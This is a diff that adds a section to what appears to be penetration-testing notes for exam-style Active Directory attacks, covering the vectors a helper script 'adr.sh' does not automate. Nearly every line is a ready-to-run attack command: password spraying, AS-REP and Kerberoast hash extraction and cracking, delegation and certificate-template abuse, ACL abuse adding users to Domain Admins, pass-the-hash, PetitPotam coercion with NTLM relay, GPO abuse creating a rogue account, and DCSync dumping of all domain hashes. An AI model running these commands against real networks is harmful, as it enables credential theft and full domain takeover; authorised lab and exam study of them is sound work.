@@ -343,3 +343,198 @@ chain_log.txt entry format:
 ```
 
 ---
+
+## What adr.sh Won't Find — Manual AD Testing
+
+> [!important] adr.sh covers the common OffSec AD path. These are the vectors it doesn't automate — work through them when BloodHound shows no clear path or standard attacks fail.
+
+---
+
+### No Valid Creds Yet — Getting Your First Foothold
+
+```bash
+# AS-REP roasting WITHOUT credentials (users with pre-auth disabled)
+impacket-GetNPUsers corp.local/ -dc-ip DC_IP -usersfile /usr/share/seclists/Usernames/Names/names.txt \
+  -no-pass -request -format hashcat 2>/dev/null | grep -v "^$\|^Impacket\|^$"
+# Or with kerbrute (faster, uses Kerberos not LDAP):
+kerbrute userenum --dc DC_IP -d corp.local \
+  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
+# Password spraying without lockout (check password policy first)
+kerbrute passwordspray --dc DC_IP -d corp.local users.txt 'Password1'
+kerbrute passwordspray --dc DC_IP -d corp.local users.txt 'Welcome1'
+kerbrute passwordspray --dc DC_IP -d corp.local users.txt 'Summer2024!'
+
+# Null session LDAP (some DCs still allow anonymous LDAP read)
+ldapsearch -x -H ldap://DC_IP -D '' -w '' -b 'DC=corp,DC=local' \
+  '(objectClass=user)' sAMAccountName 2>/dev/null | grep sAMAccountName
+
+# SMB null session user enum
+nxc smb DC_IP -u '' -p '' --users
+rpcclient -U '' -N DC_IP -c enumdomusers
+```
+
+---
+
+### When BloodHound Shows No Path to DA
+
+**Check for delegation abuse:**
+```bash
+# Find unconstrained delegation hosts (any user authenticated to these hosts = TGT captured)
+impacket-findDelegation corp.local/user:pass -dc-ip DC_IP 2>/dev/null | grep Unconstrained
+
+# Constrained delegation — can impersonate any user to the delegated service
+impacket-findDelegation corp.local/user:pass -dc-ip DC_IP 2>/dev/null | grep Constrained
+
+# Exploit constrained delegation
+impacket-getST corp.local/svc_account:pass -spn cifs/SERVER.corp.local \
+  -impersonate administrator -dc-ip DC_IP
+export KRB5CCNAME=administrator.ccache
+impacket-psexec -k -no-pass corp.local/administrator@SERVER.corp.local
+```
+
+**ADCS (AD Certificate Services) — check if running:**
+```bash
+# Check if ADCS is running (port 80/443 on an IIS server, or check services)
+nxc ldap DC_IP -u user -p pass -M adcs
+certipy find -u user@corp.local -p pass -dc-ip DC_IP -stdout 2>/dev/null | grep -A5 "Vulnerability"
+
+# ESC1 — template allows user to specify SAN (Subject Alternative Name)
+certipy req -u user@corp.local -p pass -dc-ip DC_IP -ca CANAME -template TEMPLATENAME \
+  -upn administrator@corp.local
+certipy auth -pfx administrator.pfx -dc-ip DC_IP
+# This gives you the administrator hash — spray it with sprayr.sh --from-creds
+```
+
+**ACL-based attacks not shown in BloodHound default queries:**
+```bash
+# Run BloodHound query: "Find Principals with DCSync Rights"
+# Also check: "Find Principals with GenericAll on Computer Objects"
+
+# GenericAll on a user → reset their password
+Set-ADAccountPassword -Identity "targetuser" -NewPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) -Reset
+# Or via impacket:
+impacket-changepasswd corp.local/youruser:yourpass@DC_IP -altuser targetuser \
+  -altpass '' -newpass NewPass123!
+
+# GenericAll on a group → add yourself to it
+Add-ADGroupMember -Identity "Domain Admins" -Members "youruser"
+# Or: net group "Domain Admins" youruser /add /domain
+
+# WriteOwner on an object → take ownership first
+Set-ADObject -Identity "OU=Computers,DC=corp,DC=local" -Replace @{nTSecurityDescriptor=...}
+# Use PowerView for cleaner syntax:
+Set-DomainObjectOwner -Identity targetuser -OwnerIdentity youruser
+Grant-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity youruser -Rights All
+```
+
+**Shadow credentials (no LAPS, no password reset):**
+```bash
+# Requires GenericWrite or GenericAll on a computer/user account
+# python3 pywhisker.py -d corp.local -u user -p pass --target victim_computer$ --action add
+# Creates a certificate → get hash via PKINIT
+# impacket-gettgtpkinit corp.local/victim_computer$ -cert-pfx victim.pfx -pfx-pass pass victim.ccache
+```
+
+---
+
+### When Kerberoast Hashes Won't Crack
+
+```bash
+# 1. Try targeted cracking with company-specific wordlist (CeWL the company website)
+cewl http://company.com -d 3 -m 5 -w company_words.txt
+hashcat -m 13100 kerberoast.txt company_words.txt -r /usr/share/hashcat/rules/best64.rule
+
+# 2. If you know the service account purpose, try service-specific passwords
+# (e.g., SQL service accounts often use database-related passwords)
+echo -e "SQL2019!\nSQLServer2022\nDb@admin123" > targeted.txt
+hashcat -m 13100 kerberoast.txt targeted.txt
+
+# 3. Request tickets for ALL SPNs then crack offline
+impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP -request \
+  -outputfile all_kerberoast.txt 2>/dev/null
+# Try cracking all of them — some accounts have weaker passwords than others
+
+# 4. Targeted Kerberoasting — ask for RC4 ticket instead of AES
+impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP -request \
+  -usersfile spn_users.txt -etype 23 -outputfile rc4_kerberoast.txt
+# RC4 (etype 23) is faster to crack than AES (etype 18)
+```
+
+---
+
+### Pass-the-Hash / Pass-the-Ticket
+
+```bash
+# PTH — use NTLM hash directly without cracking
+impacket-psexec corp.local/administrator@TARGET_IP -hashes :NTHASH
+impacket-wmiexec corp.local/administrator@TARGET_IP -hashes :NTHASH
+evil-winrm -i TARGET_IP -u administrator -H NTHASH
+
+# PTT — inject a TGT/TGS ticket
+export KRB5CCNAME=/path/to/ticket.ccache
+impacket-psexec -k -no-pass corp.local/user@TARGET_IP
+
+# Overpass-the-Hash (use NTLM to get a TGT)
+impacket-getTGT corp.local/user -hashes :NTHASH -dc-ip DC_IP
+export KRB5CCNAME=user.ccache
+impacket-smbexec -k -no-pass corp.local/user@TARGET_IP
+```
+
+---
+
+### Coercion Attacks (When You Have a Listening Position)
+
+When you control a system on the same network as the DC and need a Net-NTLMv2 hash for relay:
+
+```bash
+# Start responder to capture incoming hashes
+sudo responder -I tun0 -dwPv
+
+# PetitPotam — coerce authentication from DC to your machine
+python3 PetitPotam.py -u '' -p '' KALI_IP DC_IP       # unauthenticated (some DCs)
+python3 PetitPotam.py -u user -p pass KALI_IP DC_IP    # authenticated
+
+# Coercer — tries multiple coercion methods
+python3 Coercer.py coerce -l KALI_IP -t DC_IP -u user -p pass -d corp.local
+
+# Relay the captured hash to another DC or member server
+# (Works when SMB signing is not required — check signing status with nxc)
+nxc smb TARGETS_FILE -u '' -p '' --gen-relay-list relay_targets.txt
+ntlmrelayx.py -tf relay_targets.txt -smb2support --no-http-server
+```
+
+---
+
+### GPO Abuse
+
+```bash
+# Check if your user has rights to modify a GPO (via BloodHound → "Find GPO Misconfigurations")
+# PowerView:
+Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'Write'}
+
+# SharpGPOAbuse — if you can write to a GPO linked to a target OU
+.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author corp\admin \
+  --Command "cmd.exe" --Arguments "/c net user hacker Pass123! /add" \
+  --GPOName "Vulnerable GPO"
+# Force GP update: gpupdate /force (or wait for 90 min cycle)
+```
+
+---
+
+### DCSync (When You Have Replication Rights)
+
+```bash
+# Check if your account has DCSync rights (BloodHound → "Find Principals with DCSync Rights")
+# If yes:
+impacket-secretsdump corp.local/user:pass@DC_IP       # dumps ALL domain hashes
+impacket-secretsdump corp.local/user:pass@DC_IP -just-dc-user administrator
+
+# With hash:
+impacket-secretsdump corp.local/user@DC_IP -hashes :NTHASH
+
+# After dump: spray ALL hashes
+# Put NTLM hashes in hashes.txt → ./sprayr.sh --from-creds
+```
+
+---
